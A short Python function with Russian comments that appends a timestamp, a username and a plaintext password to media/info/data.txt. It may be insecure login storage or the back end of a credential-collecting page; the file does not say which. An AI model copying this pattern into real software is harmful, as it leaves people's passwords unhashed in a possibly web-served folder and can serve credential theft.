import os
from datetime import datetime


def save_credentials(username, password):
    # Путь к директории media/info
    media_info_path = os.path.join(os.getcwd(), 'media', 'info')

    # Создание директории, если она не существует
    if not os.path.exists(media_info_path):
        os.makedirs(media_info_path)

    # Путь к файлу data.txt
    data_file_path = os.path.join(media_info_path, 'data.txt')

    # Получение текущей даты и времени
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Формирование строки для записи
    data_to_write = f'{current_time}\nUsername: {username}\nPassword: {password}\n\n'

    # Добавление данных в файл
    with open(data_file_path, 'a', encoding='utf-8') as file:
        file.write(data_to_write)

